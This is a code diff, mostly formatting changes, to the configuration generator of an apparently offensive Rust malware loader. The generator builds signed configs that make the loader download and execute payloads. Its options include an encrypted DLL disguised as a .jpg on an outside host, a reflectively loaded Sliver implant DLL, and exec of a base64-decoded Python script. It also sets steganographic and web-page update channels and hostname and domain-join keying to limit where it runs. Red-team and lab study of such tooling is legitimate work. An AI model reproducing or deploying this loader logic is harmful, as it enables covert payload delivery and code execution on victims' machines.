@@ -1,5 +1,6 @@
 extern crate argparse;
 
+use malleable_rust_loader::config::Config;
 use malleable_rust_loader::dataoperation::DataOperation;
 use malleable_rust_loader::defuse::CheckInternet;
 use malleable_rust_loader::defuse::Defuse;
@@ -8,15 +9,14 @@ use malleable_rust_loader::defuse::Hostname;
 use malleable_rust_loader::defuse::Operator;
 use malleable_rust_loader::link::FileLink;
 use malleable_rust_loader::link::HTTPLink;
-use malleable_rust_loader::link::MemoryLink;
 use malleable_rust_loader::link::Link;
-use malleable_rust_loader::poollink::PoolLinks;
-use malleable_rust_loader::poollink::PoolMode;
-use malleable_rust_loader::config::Config;
+use malleable_rust_loader::link::MemoryLink;
 use malleable_rust_loader::payload::DllFromMemory;
 use malleable_rust_loader::payload::DownloadAndExec;
 use malleable_rust_loader::payload::ExecPython;
 use malleable_rust_loader::payload::Payload;
+use malleable_rust_loader::poollink::PoolLinks;
+use malleable_rust_loader::poollink::PoolMode;
 
 use ring::signature;
 use ring::signature::Ed25519KeyPair;
@@ -25,8 +25,8 @@ use std::fs;
 use malleable_rust_loader::initialloader::initialize_loader;
 
 use argparse::{ArgumentParser, Store, StoreTrue};
-use log::info;
 use log::error;
+use log::info;
 extern crate env_logger;
 
 use std::collections::BTreeMap;
@@ -40,9 +40,10 @@ fn main() {
     env_logger::init();
     let mut verbose = false;
     let mut payload = "".to_string();
-    let mut output: String  = concat!(env!("HOME"), "/.malleable/config/initial.json").to_string();
+    let mut output: String = concat!(env!("HOME"), "/.malleable/config/initial.json").to_string();
     let mut keypair: String = concat!(env!("HOME"), "/.malleable/ed25519.u8").to_string();
-    let mut payload_dataope: String = concat!(env!("HOME"), "/.malleable/payload/sliver.dll.dataop").to_string();
+    let mut payload_dataope: String =
+        concat!(env!("HOME"), "/.malleable/payload/sliver.dll.dataop").to_string();
     {
         // this block limits scope of borrows by ap.refer() method
         let mut ap = ArgumentParser::new();
@@ -51,7 +52,11 @@ fn main() {
             .add_argument("payload", Store, "choose a payload to generate the config, valid choice: banner windlexec dll py file memdll");
         ap.refer(&mut verbose)
             .add_option(&["-v", "--verbose"], StoreTrue, "Be verbose");
-        ap.refer(&mut output).add_option(&["--output"], Store,"config output path, default: /.malleable/config/initial.json");
+        ap.refer(&mut output).add_option(
+            &["--output"],
+            Store,
+            "config output path, default: /.malleable/config/initial.json",
+        );
         ap.refer(&mut keypair).add_option(&["--keypair"], Store,"path of your private ed25519 key pair to sign configuration, default: ~/.malleable/ed25519.u8)");
         ap.refer(&mut payload_dataope).add_option(&["--payload-dataop"], Store,"path of the payload dataoperations (needed for AEAD because it require cryptmaterial), default: ~/.malleable/payload/sliver.dll.dataop");
         ap.parse_args_or_exit();
@@ -60,11 +65,11 @@ fn main() {
     info!("[+] You choose payload type: {}", payload);
 
     let payload_choice: Vec<Payload>;
-    
+
     if payload == "banner".to_string() {
         info!("[+] Loader type choice: Banner");
         payload_choice = vec![Payload::Banner()];
-    }else if payload == "lindlexec".to_string() {
+    } else if payload == "lindlexec".to_string() {
         info!("[+] Loader type choice: DownloadAndExec linux");
         payload_choice = vec![Payload::DownloadAndExec(DownloadAndExec {
             link: Link::HTTP(HTTPLink {
@@ -95,7 +100,7 @@ fn main() {
     } else if payload == "dll".to_string() {
         info!("[+] Loader type choice: DllFromMemory [AEAD]");
         let payload_dataoperation: Vec<DataOperation> =
-        serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
+            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
             link: Link::HTTP(HTTPLink {
                 url: String::from("https://kaboum.xyz/artdonjon/donjon_dll.jpg"),
@@ -130,7 +135,7 @@ exec(decoded_script)
     } else if payload == "file".to_string() {
         info!("[+] Loader type choice: DllFromMemory [AEAD] from file");
         let payload_dataoperation: Vec<DataOperation> =
-        serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
+            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
             link: Link::FILE(FileLink {
                 file_path: String::from("C:\\dll\\malldll.dll.aead"),
@@ -143,7 +148,7 @@ exec(decoded_script)
     } else if payload == "memdll".to_string() {
         info!("[+] Loader type choice: DllFromMemory [AEAD]");
         let payload_dataoperation: Vec<DataOperation> =
-        serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
+            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
             link: Link::MEMORY(MemoryLink {
                 memory_nb: 1,
@@ -154,45 +159,63 @@ exec(decoded_script)
             dll_entrypoint: String::from("DllInstall"),
         })];
     } else {
-        error!(r#"You must choose a payload, from:
+        error!(
+            r#"You must choose a payload, from:
 - banner
 - windlexec
 - dll
 - py
 - file
-- memdll"#);
-    panic!()
+- memdll"#
+        );
+        panic!()
     }
 
-
     let solar_distance = BTreeMap::from([
-        ("firstupdate".to_string(), PoolLinks { pool_links:vec![
-            Link::HTTP(HTTPLink {
-                url: String::from("https://kaboum.xyz/artdonjon/gobelin.html"),
-                dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
-                jitt: 0,
-                sleep: 0,
-            }),
-            Link::HTTP(HTTPLink {
-                url: String::from("https://kaboum.xyz/artdonjon/troll.png"),
-                dataoperation: vec![DataOperation::STEGANO],
-                jitt: 0,
-                sleep: 0,
-            }),
-        ],
-        pool_mode: PoolMode::MODE1
-    }),
-    ("backup".to_string(), PoolLinks { pool_links:vec![
-        Link::HTTP(HTTPLink {
-            url: String::from("https://kaboum.xyz/artdonjon/backup.html"),
-            dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
-            jitt: 0,
-            sleep: 0,
-        }),
-    ],
-    pool_mode: PoolMode::MODE1
-}),
-
+        (
+            "1 first".to_string(),
+            PoolLinks {
+                pool_links: vec![
+                    Link::HTTP(HTTPLink {
+                        url: String::from("https://kaboum.xyz/artdonjon/gobelin.html"),
+                        dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
+                        jitt: 0,
+                        sleep: 0,
+                    }),
+                    Link::HTTP(HTTPLink {
+                        url: String::from("https://kaboum.xyz/artdonjon/troll.png"),
+                        dataoperation: vec![DataOperation::STEGANO],
+                        jitt: 0,
+                        sleep: 0,
+                    }),
+                ],
+                pool_mode: PoolMode::ONEBYONE,
+            },
+        ),
+        (
+            "2 backup".to_string(),
+            PoolLinks {
+                pool_links: vec![Link::HTTP(HTTPLink {
+                    url: String::from("https://kaboum.xyz/artdonjon/backup.html"),
+                    dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
+                    jitt: 0,
+                    sleep: 0,
+                })],
+                pool_mode: PoolMode::ONEBYONE,
+            },
+        ),
+        (
+            "3 backup".to_string(),
+            PoolLinks {
+                pool_links: vec![Link::HTTP(HTTPLink {
+                    url: String::from("https://kaboum.xyz/artdonjon/backup.html"),
+                    dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
+                    jitt: 0,
+                    sleep: 0,
+                })],
+                pool_mode: PoolMode::ONEBYONE,
+            },
+        ),
     ]);
 
     // payload is define, now, CREATE the
@@ -213,17 +236,11 @@ exec(decoded_script)
         })],
         vec![
             Defuse::Hostname(Hostname {
-                list: vec![
-                    "DEBUG-W10".to_string(),
-                    "DRACONYS".to_string(),
-                ],
+                list: vec!["DEBUG-W10".to_string(), "DRACONYS".to_string()],
                 operator: Operator::OR,
             }),
             Defuse::DomainJoin(DomainJoin {
-                list: vec![
-                    "sevenkingdoms.local".to_string(),
-                    "essos.local".to_string(),                  
-                ],
+                list: vec!["sevenkingdoms.local".to_string(), "essos.local".to_string()],
                 operator: Operator::AND,
             }),
         ],
